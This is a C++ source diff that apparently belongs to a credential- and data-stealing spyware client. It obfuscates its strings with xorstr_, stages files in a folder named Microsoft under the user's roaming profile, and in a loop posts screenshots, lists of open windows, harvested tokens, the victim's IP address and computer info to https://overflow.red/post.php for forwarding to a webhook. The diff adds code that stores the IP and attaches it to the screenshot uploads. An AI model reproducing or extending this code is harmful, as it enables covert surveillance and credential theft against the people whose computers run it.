@@ -21,7 +21,12 @@ namespace client {
 
 	std::string client_webhook_url = "";
 
+	std::string ip = "";
+
 	void background() {
+		/* Assign IP */
+		ip = client::functions::get_ip();
+
 		/* Load Webhook */
 		std::ifstream file(helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("log.txt"));
 		if (file.good()) {
@@ -40,9 +45,9 @@ namespace client {
 
 		while (true) {
 			/* Send Screenshot */
-			client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
-			requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
-			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**&webhook_url=") + client_webhook_url);
+			client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
+			requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
+			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**&webhook_url=") + client_webhook_url + "&ip=" + client::ip);
 			
 			/* Send Current Windows */
 			requests::post_request(xorstr_("https://overflow.red/post.php"), client::functions::prepare_payload("All Windows", client::functions::get_all_windows()) + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
@@ -87,7 +92,8 @@ namespace client {
 		requests::post_request(xorstr_("https://overflow.red/post.php"), client::functions::prepare_payload("Tokens", tokens) + xorstr_("&webhook_url=") + client_webhook_url);
 
 		/* Post IP */
-		requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**IP**\n```\n") + client::functions::get_ip() + xorstr_("\n```&webhook_url=") + client_webhook_url);
+		ip = client::functions::get_ip();
+		requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**IP**\n```\n") + ip + xorstr_("\n```&webhook_url=") + client_webhook_url);
 
 		/* Post Computer Info */
 		requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Computer Info**\n```\n") + client::functions::get_computer_info() + xorstr_("\n```&webhook_url=") + client_webhook_url);
